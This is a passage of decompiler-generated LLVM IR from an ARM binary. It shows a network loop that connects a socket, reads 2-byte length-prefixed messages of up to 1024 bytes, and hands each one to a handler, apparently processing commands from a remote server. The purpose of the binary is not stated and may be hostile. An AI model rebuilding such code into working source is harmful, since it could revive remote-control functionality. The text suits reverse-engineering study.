  br i1 %v5_f980, label %bb, label %bb84

bb:                                               ; preds = %dec_label_pc_f96c
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_f96c, %bb
  %v0_f990 = phi i32 [ %v2_f970, %dec_label_pc_f96c ], [ %v2_f974, %bb ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-60, align 4
  %v1_f990 = add i32 %v0_f990, 1
  store i32 %v2_f8b4, i32* %r2.global-to-local, align 4
  %v5_f9a8 = call i32 @function_130bc(i32 %v1_f990, i32 %v2_f8b0, i32 %v2_f8b4, i32 0, i32 %v2_f994)
  %v8_f9ac = icmp eq i32 %v5_f9a8, -1
  store i32 %v5_f9a8, i32* %r3.global-to-local, align 4
  br i1 %v8_f9ac, label %dec_label_pc_f8b8.backedge, label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %bb84
  %v6_f9a8 = trunc i32 %v5_f9a8 to i8
  %v3_f9b8 = icmp eq i8 %v6_f9a8, 0
  br i1 %v3_f9b8, label %dec_label_pc_f9c0, label %dec_label_pc_f9e8

dec_label_pc_f9c0:                                ; preds = %dec_label_pc_f9b8
  store i8 0, i8* %stack_var_-38, align 1
  %v2_f9d0 = call i32 @function_12cc4(i32 %stack_var_-1620.0, i32 6)
  %v2_f9d8 = icmp eq i32 %v2_f9d0, 0
  %v1_f9dc = add i32 %stack_var_-1620.0, 1
  store i32 %v1_f9dc, i32* %r2.global-to-local, align 4
  br i1 %v2_f9d8, label %dec_label_pc_fc38, label %dec_label_pc_f9e8

dec_label_pc_f9e8:                                ; preds = %dec_label_pc_f9b8, %dec_label_pc_f9c0, %dec_label_pc_fc38
  %stack_var_-37.1 = phi i8 [ 0, %dec_label_pc_fc38 ], [ 0, %dec_label_pc_f9c0 ], [ %stack_var_-37.0, %dec_label_pc_f9b8 ]
  %stack_var_-1620.1 = phi i32 [ %v1_f9dc, %dec_label_pc_fc38 ], [ %v1_f9dc, %dec_label_pc_f9c0 ], [ %stack_var_-1620.0, %dec_label_pc_f9b8 ]
  store i32 ptrtoint (i32* @global_var_1e23c.116 to i32), i32* %r3.global-to-local, align 4
  %v2_f9ec = load i32, i32* @global_var_1e23c.116, align 4
  %v7_f9f0 = icmp eq i32 %v2_f9ec, -1
  br i1 %v7_f9f0, label %dec_label_pc_fa20, label %dec_label_pc_f9f8

dec_label_pc_f9f8:                                ; preds = %dec_label_pc_f9e8
  %v3_f9f8 = udiv i32 %v2_f9ec, 32
  %v3_fa00 = mul nuw nsw i32 %v3_f9f8, 4
  %v2_fa08 = add i32 %v3_fa00, %v2_f764
  store i32 %v2_fa08, i32* %r3.global-to-local, align 4
  %v1_fa0c = add i32 %v2_fa08, -556
  %v2_fa0c = inttoptr i32 %v1_fa0c to i32*
  %v3_fa0c = load i32, i32* %v2_fa0c, align 4
  %v1_fa10 = urem i32 %v2_f9ec, 32
  %v6_fa14 = lshr i32 %v3_fa0c, %v1_fa10
  store i32 %v6_fa14, i32* %r2.global-to-local, align 4
  %v1_fa18 = urem i32 %v6_fa14, 2
  %v2_fa18 = icmp eq i32 %v1_fa18, 0
  br i1 %v2_fa18, label %dec_label_pc_fa20, label %dec_label_pc_fcb8

dec_label_pc_fa20:                                ; preds = %dec_label_pc_f9f8, %dec_label_pc_f9e8
  store i32 ptrtoint (i8** @global_var_1e3dc.154 to i32), i32* %r3.global-to-local, align 4
  %v2_fa24 = load i8, i8* bitcast (i8** @global_var_1e3dc.154 to i8*), align 4
  %v3_fa24 = zext i8 %v2_fa24 to i32
  store i32 %v3_fa24, i32* @r4, align 4
  %v2_fa28 = icmp eq i8 %v2_fa24, 0
  %v2_fab8 = load i32, i32* @global_var_1e240.151, align 4
  br i1 %v2_fa28, label %dec_label_pc_fab8, label %dec_label_pc_fa30

dec_label_pc_fa30:                                ; preds = %dec_label_pc_fa20
  %v3_fa38 = udiv i32 %v2_fab8, 32
  %v3_fa40 = mul nuw nsw i32 %v3_fa38, 4
  %v2_fa44 = add i32 %v3_fa40, %v2_f764
  store i32 %v2_fa44, i32* %r3.global-to-local, align 4
  %v1_fa48 = add i32 %v2_fa44, -300
  %v2_fa48 = inttoptr i32 %v1_fa48 to i32*
  %v3_fa48 = load i32, i32* %v2_fa48, align 4
  %v1_fa4c = urem i32 %v2_fab8, 32
  %v6_fa50 = lshr i32 %v3_fa48, %v1_fa4c
  store i32 %v6_fa50, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e3dc.154 to i32), i32* %r3.global-to-local, align 4
  %v1_fa5c = urem i32 %v6_fa50, 2
  %v2_fa5c = icmp eq i32 %v1_fa5c, 0
  store i8 0, i8* bitcast (i8** @global_var_1e3dc.154 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1e240.151 to i32), i32* @r5, align 4
  br i1 %v2_fa5c, label %dec_label_pc_fa6c, label %dec_label_pc_fc58

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa30
  store i32 64116, i32* @lr, align 4
  %v1_fa70 = icmp ne i32 %v2_fab8, -1
  call void @__pseudo_cond_branch(i1 %v1_fa70, i32 ptrtoint (i32* @global_var_12e9c.25 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fa78 = load i32, i32* @r5, align 4
  %v2_fa78 = inttoptr i32 %v1_fa78 to i32*
  store i32 -1, i32* %v2_fa78, align 4
  %v1_fa80 = call i32 @function_142c4(i32 1)
  br label %dec_label_pc_f8b8.backedge

dec_label_pc_f8b8.backedge:                       ; preds = %dec_label_pc_fa6c, %dec_label_pc_fba4, %dec_label_pc_fc90, %dec_label_pc_fd44, %dec_label_pc_fd6c, %dec_label_pc_fddc, %bb84, %dec_label_pc_fab8, %dec_label_pc_fac8, %dec_label_pc_fcf8, %bb86, %dec_label_pc_fd88, %dec_label_pc_fd58
  %stack_var_-37.0.be = phi i8 [ %stack_var_-37.0, %bb84 ], [ %stack_var_-37.1, %dec_label_pc_fab8 ], [ %stack_var_-37.1, %dec_label_pc_fac8 ], [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.2, %dec_label_pc_fba4 ], [ %stack_var_-37.1, %dec_label_pc_fd6c ], [ %v3_fda0, %dec_label_pc_fd88 ], [ %v3_fda0, %dec_label_pc_fddc ], [ %stack_var_-37.1, %dec_label_pc_fa6c ], [ %stack_var_-37.1, %dec_label_pc_fcf8 ], [ %stack_var_-37.1, %dec_label_pc_fd44 ], [ %stack_var_-37.1, %dec_label_pc_fc90 ], [ %stack_var_-37.3, %dec_label_pc_fd58 ]
  %stack_var_-1620.0.be = phi i32 [ %stack_var_-1620.0, %bb84 ], [ %stack_var_-1620.1, %dec_label_pc_fab8 ], [ %stack_var_-1620.1, %dec_label_pc_fac8 ], [ %stack_var_-1620.1, %bb86 ], [ %stack_var_-1620.1, %dec_label_pc_fba4 ], [ %stack_var_-1620.1, %dec_label_pc_fd6c ], [ %stack_var_-1620.1, %dec_label_pc_fd88 ], [ %stack_var_-1620.1, %dec_label_pc_fddc ], [ %stack_var_-1620.1, %dec_label_pc_fa6c ], [ %stack_var_-1620.1, %dec_label_pc_fcf8 ], [ %stack_var_-1620.1, %dec_label_pc_fd44 ], [ %stack_var_-1620.1, %dec_label_pc_fc90 ], [ %stack_var_-1620.1, %dec_label_pc_fd58 ]
  %v2_f8c087.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f8b8

dec_label_pc_fa88:                                ; preds = %dec_label_pc_f930
  store i32 %v2_f764, i32* %r2.global-to-local, align 4
  %v3_fa98 = mul nuw nsw i32 %v3_fa90, 4
  %v2_fa9c = add i32 %v3_fa98, %v2_f764
  store i32 %v2_fa9c, i32* %r3.global-to-local, align 4
  %v1_faa0 = add i32 %v2_fa9c, -556
  %v2_faa0 = inttoptr i32 %v1_faa0 to i32*
  %v3_faa0 = load i32, i32* %v2_faa0, align 4
  %v1_faa4 = urem i32 %v2_fa88, 32
  %v7_faac = shl i32 1, %v1_faa4
  %v8_faac = or i32 %v3_faa0, %v7_faac
  store i32 %v8_faac, i32* %r2.global-to-local, align 4
  store i32 %v8_faac, i32* %v2_faa0, align 4
  br label %dec_label_pc_f96c

dec_label_pc_fab8:                                ; preds = %dec_label_pc_fa20
  %v7_fabc = icmp eq i32 %v2_fab8, -1
  store i32 ptrtoint (i32* @global_var_1e240.151 to i32), i32* @r5, align 4
  br i1 %v7_fabc, label %dec_label_pc_f8b8.backedge, label %dec_label_pc_fac8

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fab8
  %v3_fac8 = udiv i32 %v2_fab8, 32
  store i32 %v2_f764, i32* %r2.global-to-local, align 4
  %v3_fad4 = mul nuw nsw i32 %v3_fac8, 4
  %v2_fad8 = add i32 %v3_fad4, %v2_f764
  store i32 %v2_fad8, i32* %r3.global-to-local, align 4
  %v1_fadc = add i32 %v2_fad8, -556
  %v2_fadc = inttoptr i32 %v1_fadc to i32*
  %v3_fadc = load i32, i32* %v2_fadc, align 4
  %v1_fae0 = urem i32 %v2_fab8, 32
  %v6_fae4 = lshr i32 %v3_fadc, %v1_fae0
  store i32 %v6_fae4, i32* %r2.global-to-local, align 4
  %v1_fae8 = urem i32 %v6_fae4, 2
  %v2_fae8 = icmp eq i32 %v1_fae8, 0
  br i1 %v2_fae8, label %dec_label_pc_f8b8.backedge, label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fac8
  %v0_faf0 = call i32 @function_13470()
  %v0_faf4 = load i32, i32* @r4, align 4
  %v2_faf4 = inttoptr i32 %v0_faf0 to i32*
  store i32 %v0_faf4, i32* %v2_faf4, align 4
  store i32 %v0_faf0, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_fb08 = load i32, i32* @global_var_1e240.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_fb14 = call i32 @function_136a0(i32 %v2_fb08, i32* %v5_fc50, i32 2, i32 16386)
  %v7_fb18 = icmp eq i32 %v5_fb14, -1
  br i1 %v7_fb18, label %dec_label_pc_fd58, label %dec_label_pc_fb20

dec_label_pc_fb20:                                ; preds = %dec_label_pc_faf0
  %v2_fb20 = icmp eq i32 %v5_fb14, 0
  br i1 %v2_fb20, label %dec_label_pc_fba4, label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %dec_label_pc_fb20
  %v3_fb28 = load i8, i8* %stack_var_-38, align 1
  %v4_fb28 = sext i8 %v3_fb28 to i32
  %v4_fb2c = zext i8 %stack_var_-37.1 to i32
  store i32 %v4_fb2c, i32* %r3.global-to-local, align 4
  %v4_fb30 = mul nuw nsw i32 %v4_fb2c, 256
  %v5_fb30 = or i32 %v4_fb28, %v4_fb30
  store i32 %v5_fb30, i32* %r2.global-to-local, align 4
  %v7_fb30 = icmp eq i32 %v5_fb30, 0
  br i1 %v7_fb30, label %dec_label_pc_fd6c, label %dec_label_pc_fb38

dec_label_pc_fb38:                                ; preds = %dec_label_pc_fb28
  %v1_fb38 = mul nsw i32 %v4_fb28, 256
  %v3_fb3c = and i32 %v1_fb38, 65280
  %v4_fb40 = udiv i32 %v5_fb30, 256
  %v5_fb40 = or i32 %v3_fb3c, %v4_fb40
  store i32 %v5_fb40, i32* %r3.global-to-local, align 4
  %v3_fb444 = udiv i32 %v5_fb40, 256
  store i32 %v3_fb444, i32* %r2.global-to-local, align 4
  %v1_fb4c = trunc i32 %v3_fb444 to i8
  %v6_fb50 = trunc i32 %v4_fb40 to i8
  store i8 %v6_fb50, i8* %stack_var_-38, align 1
  %tmp103 = icmp ult i32 %v5_fb40, 1025
  br i1 %tmp103, label %dec_label_pc_fb68, label %dec_label_pc_fb58

dec_label_pc_fb58:                                ; preds = %dec_label_pc_fb38
  %v2_fb58 = load i32, i32* @global_var_1e240.151, align 4
  %v1_fb5c = call i32 @function_12e9c(i32 %v2_fb58)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fb64 = load i32, i32* @r5, align 4
  %v2_fb64 = inttoptr i32 %v1_fb64 to i32*
  store i32 -1, i32* %v2_fb64, align 4
  %v3_fb70.pre = load i8, i8* %stack_var_-38, align 1
  br label %dec_label_pc_fb68

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb38, %dec_label_pc_fb58
  %v3_fb70 = phi i8 [ %v6_fb50, %dec_label_pc_fb38 ], [ %v3_fb70.pre, %dec_label_pc_fb58 ]
  %v0_fb68 = load i32, i32* @r4, align 4
  %v1_fb68 = load i32, i32* @r8, align 4
  %v2_fb68 = inttoptr i32 %v1_fb68 to i32*
  store i32 %v0_fb68, i32* %v2_fb68, align 4
  %v4_fb6c = urem i32 %v3_fb444, 256
  %v4_fb70 = sext i8 %v3_fb70 to i32
  store i32 %v2_fb78, i32* @r4, align 4
  %v4_fb80 = mul nuw nsw i32 %v4_fb6c, 256
  %v5_fb80 = or i32 %v4_fb70, %v4_fb80
  store i32 %v5_fb80, i32* %r2.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_fb88 = load i32, i32* @global_var_1e240.151, align 4
  %v5_fb90 = call i32 @function_136a0(i32 %v2_fb88, i32* nonnull %stack_var_-1616, i32 %v5_fb80, i32 16386)
  %v7_fb94 = icmp eq i32 %v5_fb90, -1
  br i1 %v7_fb94, label %dec_label_pc_fd58, label %dec_label_pc_fb9c

dec_label_pc_fb9c:                                ; preds = %dec_label_pc_fb68
  %v2_fb9c = icmp eq i32 %v5_fb90, 0
  br i1 %v2_fb9c, label %dec_label_pc_fba4, label %dec_label_pc_fd88

dec_label_pc_fba4:                                ; preds = %bb86, %dec_label_pc_fb9c, %dec_label_pc_fb20
  %stack_var_-37.2 = phi i8 [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.1, %dec_label_pc_fb20 ], [ %v1_fb4c, %dec_label_pc_fb9c ]
  %v2_fba4 = load i32, i32* @global_var_1e240.151, align 4
  store i32 64432, i32* @lr, align 4
  %v1_fbac = icmp ne i32 %v2_fba4, -1
  call void @__pseudo_cond_branch(i1 %v1_fbac, i32 ptrtoint (i32* @global_var_12e9c.25 to i32))
  store i32 ptrtoint (i32* @global_var_1e240.151 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1e240.151, align 4
  %v1_fbc0 = call i32 @function_142c4(i32 1)
  br label %dec_label_pc_f8b8.backedge

dec_label_pc_fbc8:                                ; preds = %dec_label_pc_f920
  %v0_fbd0 = load i32, i32* @r4, align 4
  store i32 %v0_fbd0, i32* %r2.global-to-local, align 4
  %v3_fbd4 = call i32 @function_13790(i32 2, i32 1, i32 %v0_fbd0)
  %v7_fbd8 = icmp eq i32 %v3_fbd4, -1
  store i32 %v3_fbd4, i32* %r5.global-to-local, align 4
  %v1_fbe0 = load i32, i32* @r8, align 4
  %v2_fbe0 = inttoptr i32 %v1_fbe0 to i32*
  store i32 %v3_fbd4, i32* %v2_fbe0, align 4
  br i1 %v7_fbd8, label %dec_label_pc_f930, label %dec_label_pc_fbe8

dec_label_pc_fbe8:                                ; preds = %dec_label_pc_fbc8
  %v0_fbe8 = load i32, i32* @r4, align 4
  store i32 %v0_fbe8, i32* @r2, align 4
  %v2_fbf0 = call i32 @function_12dac(i32 %v3_fbd4, i32 3)
  %v1_fbf8 = or i32 %v2_fbf0, 2048
  store i32 %v1_fbf8, i32* @r2, align 4
  %v0_fbfc = load i32, i32* %r5.global-to-local, align 4
  %v2_fc00 = call i32 @function_12dac(i32 %v0_fbfc, i32 4)
  %v2_fc08 = load i32, i32* @global_var_1e244.109, align 4
  store i32 %v2_fc08, i32* %r3.global-to-local, align 4
  %v2_fc0c = icmp eq i32 %v2_fc08, 0
  br i1 %v2_fc0c, label %.thread, label %bb85

bb85:                                             ; preds = %dec_label_pc_fbe8
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_12794.156 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fbe8, %bb85
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_fc20 = load i32, i32* @global_var_1e240.151, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1e3dc.154 to i8*), align 4
  %v5_fc30 = call i32 @function_135ec(i32 %v2_fc20, %sockaddr* bitcast (i8** @global_var_1e478.111 to %sockaddr*), i32 16)
  br label %dec_label_pc_f930

dec_label_pc_fc38:                                ; preds = %dec_label_pc_f9c0
  %v2_fc40 = load i32, i32* @global_var_1e240.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_fc50 = call i32 @function_13700(i32 %v2_fc40, i32* nonnull %v5_fc50, i32 2, i32 16384)
  br label %dec_label_pc_f9e8

dec_label_pc_fc58:                                ; preds = %dec_label_pc_fa30
  store i32 4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 %v2_fc68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v6_fc80 = call i32 @function_13644(i32 %v2_fab8, i32 1, i32 4, i32* nonnull %stack_var_-48, i32 %v2_fc6c)
  %v3_fc84 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_fc84, i32* %r3.global-to-local, align 4
  %v2_fc88 = icmp eq i32 %v3_fc84, 0
  br i1 %v2_fc88, label %dec_label_pc_fcf8, label %dec_label_pc_fc90

dec_label_pc_fc90:                                ; preds = %dec_label_pc_fc58
  %v2_fc90 = load i32, i32* @global_var_1e240.151, align 4
  %v1_fc94 = call i32 @function_12e9c(i32 %v2_fc90)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fc9c = load i32, i32* @r5, align 4
  %v2_fc9c = inttoptr i32 %v1_fc9c to i32*
  store i32 -1, i32* %v2_fc9c, align 4
  %v0_fca0 = call i32 @function_fe24()
  %v2_fca8 = call i32 @function_12bf8(i32 %v0_fca0, i32 10)
  %v1_fcac = add i32 %v2_fca8, 1
  %v1_fcb0 = call i32 @function_142c4(i32 %v1_fcac)
  br label %dec_label_pc_f8b8.backedge

dec_label_pc_fcb8:                                ; preds = %dec_label_pc_f9f8
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_fc68, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_fcd0 = call i32 @function_13594(i32 %v2_f9ec, %sockaddr* %v5_fcd0, i32 %v2_fc68, i32 16, i32 16)
  %v1_fcd4 = call i32 @function_100e4(i32 %v6_fcd0)
  %v1_fcd8 = call i32 @function_e530(i32 %v1_fcd4)
  %v1_fcdc = call i32 @function_a32c(i32 %v1_fcd8)
  store i32 %v1_f874, i32* %r2.global-to-local, align 4
  %v2_fcec = call i32 @function_12f9c(i32 %v1_fce8, i32 9)
  %v1_fcf4 = call i32 @function_14230(i32 0)
  br label %dec_label_pc_fcf8

dec_label_pc_fcf8:                                ; preds = %dec_label_pc_fc58, %dec_label_pc_fcb8
  %v2_fcfc = call i32 @function_124dc(i8* %v1_fcfc)
  %v3_fcfc = trunc i32 %v2_fcfc to i8
  store i8 %v3_fcfc, i8* %stack_var_-38, align 1
  %v0_fd04 = call i32 @function_12794()
  %v0_fd08 = load i32, i32* @r4, align 4
  store i32 %v0_fd08, i32* %r2.global-to-local, align 4
  %v1_fd0c = load i32, i32* @fp, align 4
  %v2_fd0c = inttoptr i32 %v1_fd0c to i32*
  store i32 %v0_fd04, i32* %v2_fd0c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fd18 = load i32, i32* @r5, align 4
  %v1_fd18 = inttoptr i32 %v0_fd18 to i32*
  %v2_fd18 = load i32, i32* %v1_fd18, align 4
  %v5_fd1c = call i32 @function_13700(i32 %v2_fd18, i32* nonnull @global_var_157d8.158, i32 %v0_fd08, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_fd28 = load i32, i32* @r5, align 4
  %v1_fd28 = inttoptr i32 %v0_fd28 to i32*
  %v2_fd28 = load i32, i32* %v1_fd28, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fd34 = call i32 @function_13700(i32 %v2_fd28, i32* %v5_fc50, i32 1, i32 16384)
  %v3_fd38 = load i8, i8* %stack_var_-38, align 1
  %v4_fd38 = sext i8 %v3_fd38 to i32
  store i32 %v4_fd38, i32* %r2.global-to-local, align 4
  %v2_fd3c = icmp eq i8 %v3_fd38, 0
  br i1 %v2_fd3c, label %dec_label_pc_f8b8.backedge, label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %dec_label_pc_fcf8
  %v0_fd44 = load i32, i32* @r5, align 4
  %v1_fd44 = inttoptr i32 %v0_fd44 to i32*
  %v2_fd44 = load i32, i32* %v1_fd44, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fd50 = call i32 @function_13700(i32 %v2_fd44, i32* nonnull %stack_var_-138, i32 %v4_fd38, i32 16384)
  br label %dec_label_pc_f8b8.backedge

dec_label_pc_fd58:                                ; preds = %dec_label_pc_fb68, %dec_label_pc_faf0
  %stack_var_-37.3 = phi i8 [ %stack_var_-37.1, %dec_label_pc_faf0 ], [ %v1_fb4c, %dec_label_pc_fb68 ]
  %v0_fd58 = load i32, i32* @r8, align 4
  %v1_fd58 = inttoptr i32 %v0_fd58 to i32*
  %v2_fd58 = load i32, i32* %v1_fd58, align 4
  store i32 %v2_fd58, i32* %r3.global-to-local, align 4
  %v7_fd5c = icmp eq i32 %v2_fd58, 4
  br i1 %v7_fd5c, label %dec_label_pc_f8b8.backedge, label %bb86

bb86:                                             ; preds = %dec_label_pc_fd58
  %v8_fd60 = icmp eq i32 %v2_fd58, 11
  br i1 %v8_fd60, label %dec_label_pc_f8b8.backedge, label %dec_label_pc_fba4

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fb28
  %v2_fd70 = load i32, i32* @global_var_1e240.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fd80 = call i32 @function_136a0(i32 %v2_fd70, i32* nonnull %v5_fc50, i32 2, i32 16384)
  br label %dec_label_pc_f8b8.backedge

dec_label_pc_fd88:                                ; preds = %dec_label_pc_fb9c
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_fd98 = load i32, i32* @global_var_1e240.151, align 4
  %v5_fd9c = call i32 @function_136a0(i32 %v2_fd98, i32* nonnull %v5_fc50, i32 2, i32 16384)
  %v3_fda0 = load i8, i8* %stack_var_-38, align 1
  %v4_fda0 = sext i8 %v3_fda0 to i32
  %v4_fda8 = mul nsw i32 %v4_fda0, 256
  %v5_fda8 = or i32 %v4_fda8, %v4_fb6c
  store i32 %v5_fda8, i32* %r2.global-to-local, align 4
  store i32 %v4_fda0, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_fdbc = load i32, i32* @global_var_1e240.151, align 4
  store i8 %v1_fb4c, i8* %stack_var_-38, align 1
  %v8_fdc8 = call i32 @function_136a0(i32 %v2_fdbc, i32* nonnull %stack_var_-1616, i32 %v5_fda8, i32 16384)
  %v3_fdcc = load i8, i8* %stack_var_-38, align 1
  %v4_fdcc = sext i8 %v3_fdcc to i32
  store i32 %v4_fdcc, i32* %r2.global-to-local, align 4
  %v4_fdd0 = zext i8 %v3_fda0 to i32
  store i32 %v4_fdd0, i32* %r3.global-to-local, align 4
  %v4_fdd4 = mul nuw nsw i32 %v4_fdd0, 256
  %v5_fdd4 = or i32 %v4_fdcc, %v4_fdd4
  %v7_fdd4 = icmp eq i32 %v5_fdd4, 0
  br i1 %v7_fdd4, label %dec_label_pc_f8b8.backedge, label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fd88
  %v5_fde0 = call i32 @function_a0d8(i32* nonnull %stack_var_-1616, i32 %v5_fdd4, i32 %v4_fdcc, i32 %v4_fdd0)
  br label %dec_label_pc_f8b8.backedge

; uselistorder directives
  uselistorder i32 %v4_fdd0, { 1, 0, 2 }
  uselistorder i32 %v4_fdcc, { 1, 0, 2 }
  uselistorder i32 %v4_fda0, { 1, 0 }
  uselistorder i8 %v3_fda0, { 2, 3, 1, 0 }
  uselistorder i8 %stack_var_-37.3, { 1, 0, 2 }
  uselistorder i32 %v3_fbd4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_fb90, { 1, 0 }
  uselistorder i32 %v4_fb6c, { 1, 0 }
  uselistorder i8 %v1_fb4c, { 0, 2, 1 }
  uselistorder i32 %v3_fb444, { 0, 2, 1 }
  uselistorder i32 %v4_fb40, { 1, 0 }
  uselistorder i32 %v5_fb14, { 1, 0 }
  uselistorder i32 %v2_fab8, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_f9ec, { 3, 2, 1, 0 }
  uselistorder i8 %stack_var_-37.1, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %v5_f9a8, { 2, 1, 0 }
  uselistorder i32 %v2_f8ec, { 2, 1, 0 }
  uselistorder i32 %v1_f8dc, { 1, 2, 0 }
  uselistorder i32 %v1_f8c4, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1620.0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_fc68, { 1, 0, 2 }
  uselistorder i32* %v5_fc50, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v2_f8b4, { 1, 0, 2 }
  uselistorder i32 %v2_f8b0, { 1, 0, 2 }
  uselistorder i32 %v4_f81c, { 1, 2, 0 }
  uselistorder i32 %v2_f764, { 0, 9, 1, 10, 2, 3, 4, 5, 8, 6, 11, 7 }
  uselistorder i32 %v1_f6b0, { 1, 2, 0 }
  uselistorder i32 %v0_f6ac, { 1, 0 }
  uselistorder i32 %v1_f680, { 1, 0 }
  uselistorder i32 %v0_f674, { 1, 0 }
  uselistorder i32 %v1_f64c, { 1, 0 }
  uselistorder i32 %v0_f640, { 1, 0 }
  uselistorder i32 %v1_f618, { 1, 0 }
  uselistorder i32 %v0_f60c, { 1, 0 }
  uselistorder i32 %v1_f5e4, { 1, 0 }
  uselistorder i32 %v0_f5d4, { 1, 0 }
  uselistorder i32 %v0_f5b0, { 1, 0 }
  uselistorder i32 %v2_f4ec, { 0, 2, 1 }
  uselistorder i32 %v4_f48c, { 1, 2, 0 }
  uselistorder i32 %v2_f434, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-36, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-48, { 1, 2, 0, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-106, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-138, { 1, 2, 0, 3 }
  uselistorder i8* %stack_var_-38, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-1616, { 1, 0, 2, 3 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 57, 58, 41, 42, 38, 55, 56, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32* @global_var_1e244.109, { 1, 0 }
  uselistorder i32 16386, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 (i32)* @function_142c4, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e3dc.154 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1e3dc.154, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e3dc.154 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1e23c.116, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_1e240.151, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 (i8*, i32)* @function_12504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 62, 63, 64, 65, 66, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32, i32)* @function_fed8, { 2, 1, 0 }
  uselistorder i32 ()* @function_f2b4, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_128bc, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32)* @function_12cc4, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e478.111 to i32), { 1, 0 }
  uselistorder [2 x i8]* @global_var_15760.23, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_f248.121 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_1381c, { 1, 0 }
  uselistorder label %dec_label_pc_fcf8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fb68, { 1, 0 }
  uselistorder label %dec_label_pc_f8b8.backedge, { 5, 11, 4, 10, 12, 3, 9, 2, 1, 8, 7, 0, 6 }
  uselistorder label %dec_label_pc_f9e8, { 2, 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_f930, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f920, { 1, 0 }
